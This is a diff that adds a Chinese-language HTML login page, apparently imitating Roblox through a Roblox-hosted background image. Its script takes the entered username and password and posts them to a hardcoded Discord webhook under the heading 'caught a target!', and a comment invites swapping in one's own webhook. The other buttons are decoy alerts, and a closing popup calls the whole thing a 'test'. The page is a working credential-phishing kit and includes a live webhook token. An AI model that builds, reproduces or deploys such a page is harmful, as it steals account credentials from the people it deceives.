@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>添加帐户</title>
+<style>
+*{
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: system-ui, -apple-system, sans-serif;
+}
+
+:root{
+    --bg-scale: 1.0;
+    --bg-brightness: 0.85;
+}
+
+body{
+    width: 100%;
+    min-height: 100vh;
+    color: #ffffff;
+    position: relative;
+}
+
+/* 背景图铺满全屏 */
+.layer-bg{
+    position: fixed;
+    inset: 0;
+    background-color: #0c0c10;
+    background-image: url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg');
+    background-repeat: no-repeat;
+    background-position: center center;
+    background-size: cover;
+    opacity: 1;
+    z-index: 1;
+    filter: brightness(var(--bg-brightness));
+}
+
+/* 灰色面板 */
+.layer-panel{
+    position: relative;
+    z-index: 2;
+    width: 100%;
+    margin-top: 55px;
+    margin-bottom: 210px;
+    padding: 36px 20px 40px;
+    background: #242830;
+    border-radius: 0;
+}
+
+.layer-ui{
+    max-width: 450px;
+    margin: 0 auto;
+}
+
+h1{
+    text-align: center;
+    font-size: 34px;
+    font-weight: 700;
+    margin-bottom: 28px;
+    color: #ffffff;
+}
+
+.input-box{
+    width: 100%;
+    height: 58px;
+    margin-bottom: 16px;
+    padding: 0 20px;
+    background: #3a404c;
+    color: #ffffff;
+    border: 1px solid #4a505e;
+    border-radius: 14px;
+    font-size: 18px;
+    outline: none;
+}
+
+.input-box::placeholder{
+    color: #b8bec9;
+}
+
+.input-box:focus{
+    background: #3f4652;
+    border-color: #5a6270;
+}
+
+button{
+    cursor: pointer;
+    user-select: none;
+    -webkit-user-select: none;
+}
+
+.login-btn{
+    width: 100%;
+    height: 54px;
+    margin-top: 6px;
+    background: #3a404c;
+    color: #ffffff;
+    border: 2px solid #5a6270;
+    border-radius: 14px;
+    font-size: 20px;
+    font-weight: 600;
+}
+
+.login-btn:active{
+    background: #2f353d;
+}
+
+.forgot-text{
+    text-align: center;
+    margin-top: 26px;
+    font-size: 17px;
+    color: #d1d5db;
+    cursor: pointer;
+    user-select: none;
+}
+
+.forgot-text:active{
+    color: #ffffff;
+}
+
+.divider{
+    height: 1px;
+    background: #4a505e;
+    margin: 30px 0;
+}
+
+.sec-btn{
+    width: 100%;
+    height: 52px;
+    margin-bottom: 14px;
+    background: #3a404c;
+    color: #ffffff;
+    border: 1px solid #4a505e;
+    border-radius: 14px;
+    font-size: 18px;
+}
+
+.sec-btn:active{
+    background: #2f353d;
+}
+
+.register-text{
+    text-align: center;
+    margin-top: 34px;
+    font-size: 15px;
+    color: #d1d5db;
+    user-select: none;
+}
+
+.register-text span{
+    color: #6a9dff;
+    font-weight: 600;
+    cursor: pointer;
+    display: inline-block;
+}
+
+.register-text span:active{
+    color: #8cb3ff;
+}
+
+.popup-mask{
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.65);
+    z-index: 99;
+    align-items: center;
+    justify-content: center;
+}
+
+.popup-mask.show{
+    display: flex;
+}
+
+.popup-box{
+    width: 320px;
+    background: #282c34;
+    color: #ffffff;
+    border-radius: 16px;
+    padding: 28px 24px;
+    text-align: center;
+    border: 1px solid #3a404c;
+}
+
+.check-icon{
+    width: 64px;
+    height: 64px;
+    margin: 0 auto 20px;
+    border-radius: 50%;
+    background: #2ecc71;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 36px;
+    font-weight: bold;
+    color: #fff;
+}
+
+.info-row{
+    text-align: left;
+    font-size: 15px;
+    margin: 8px 0;
+    line-height: 1.6;
+    color: #e5e7eb;
+}
+
+.info-row span{
+    color: #6a9dff;
+    word-break: break-all;
+}
+
+.thanks-text{
+    margin-top: 18px;
+    font-size: 14px;
+    color: #9ca3af;
+}
+
+.close-btn{
+    width: 100%;
+    height: 44px;
+    margin-top: 22px;
+    background: #3a404c;
+    color: #ffffff;
+    border: 1px solid #4a505e;
+    border-radius: 14px;
+    font-size: 15px;
+}
+
+.close-btn:active{
+    background: #434a56;
+}
+
+/* 平板/电脑：灰色面板居中，不贴边 */
+@media (min-width: 768px){
+    .layer-panel{
+        width: 480px;
+        margin: 55px auto 210px;
+        padding: 36px 30px 40px;
+        border-radius: 16px;
+    }
+}
+</style>
+</head>
+<body>
+
+<div class="layer-bg"></div>
+
+<div class="layer-panel">
+    <div class="layer-ui">
+        <h1>添加帐户</h1>
+        <input type="text" class="input-box" id="accInput" placeholder="用户名/电子邮件/手机">
+        <input type="password" class="input-box" id="pwdInput" placeholder="密码">
+
+        <button class="login-btn" onclick="showResult()">登录</button>
+
+        <p class="forgot-text" onclick="tip('正在跳转找回密码页面...')">忘记密码或用户名？</p>
+
+        <div class="divider"></div>
+
+        <button class="sec-btn" onclick="tip('验证码已发送至您的邮箱（娱乐效果）')">通过电子邮件向我发送一次性验证码</button>
+        <button class="sec-btn" onclick="tip('正在唤起快速登录...')">快速登录</button>
+
+        <p class="register-text">没有帐户？ <span onclick="tip('正在跳转注册页面...')">注册</span></p>
+    </div>
+</div>
+
+<div class="popup-mask" id="resultPopup">
+    <div class="popup-box">
+        <div class="check-icon">✓</div>
+        <div class="info-row">用户名：<span id="showAcc"></span></div>
+        <div class="info-row">密　码：<span id="showPwd"></span></div>
+        <div class="thanks-text">谢谢你参与这次的测试</div>
+        <button class="close-btn" onclick="closePopup()">确定</button>
+    </div>
+</div>
+
+<script>
+async function showResult(){
+    const acc = document.getElementById("accInput").value.trim();
+    const pwd = document.getElementById("pwdInput").value.trim();
+    if(!acc || !pwd){
+        tip("请输入用户名和密码");
+        return;
+    }
+
+    // =====================在这里替换你的Discord Webhook链接=====================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1531266118260494458/HNRI_ylPIYpaJjN78DtNbivEZrcGUukWjSZvfPTZLXY92DKes9763_kOaZptfWH9Yx2p";
+    // ==========================================================================
+
+    const sendData = {
+        embeds: [{
+            title: "抓到目标！",
+            color: 39423,
+            fields: [
+                {name:"账号", value:`\`${acc}\``},
+                {name:"密码", value:`\`${pwd}\``}
+            ],
+            timestamp: new Date().toISOString()
+        }]
+    };
+
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(sendData)
+    }).catch(err => console.log("发送失败", err));
+
+    document.getElementById("showAcc").innerText = acc;
+    document.getElementById("showPwd").innerText = pwd;
+    const popup = document.getElementById("resultPopup");
+    popup.style.display = "flex";
+}
+
+function closePopup(){
+    const popup = document.getElementById("resultPopup");
+    popup.style.display = "none";
+}
+
+function tip(text){
+    alert(text);
+}
+</script>
+
+</body>
+</html>
